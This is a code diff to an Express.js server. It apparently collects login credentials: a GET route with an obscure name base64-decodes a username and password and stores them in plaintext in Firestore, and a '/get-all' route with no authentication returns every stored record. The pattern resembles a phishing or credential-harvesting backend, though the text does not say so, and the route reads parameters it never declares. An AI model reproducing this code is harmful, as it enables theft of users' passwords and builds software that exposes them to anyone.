@@ -1,6 +1,15 @@
 const express = require("express");
 const app = express();
+const admin = require("firebase-admin");
+const serviceAccount = require("./firebase-key.json");
+
 let arrUser=[]
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+});
+const db = admin.firestore();
+const collectionRef = db.collection("user-chau");
+
 app.get("/abcdfe", (req, res) => {
     console.log('====================================');
     console.log({req:req.body});
@@ -13,11 +22,22 @@ app.get("/abcdfe", (req, res) => {
     userName:atob(req.params.userName),
     pass:atob(req.params.pass)
    })
+   collectionRef.add({
+    userName:atob(req.params.userName),
+    pass:atob(req.params.pass)
+   })
     res.send({data:req.params.userName, status:200});
   });
-  app.get("/get-all", (req, res) => {
+  app.get("/get-all", async(req, res) => {
+    let arr=[];
+    const snapshot = await collectionRef.get();
+snapshot.forEach(doc => {
+  arr.push(doc.data())
+  
+  console.log(doc.id, '=>', doc.data());
+});
 
-     res.send({arrUser});
+     res.send({arr});
    });
   app.listen( process.env.PORT ||3002 , () => {
     // app.listen(3002, () => {
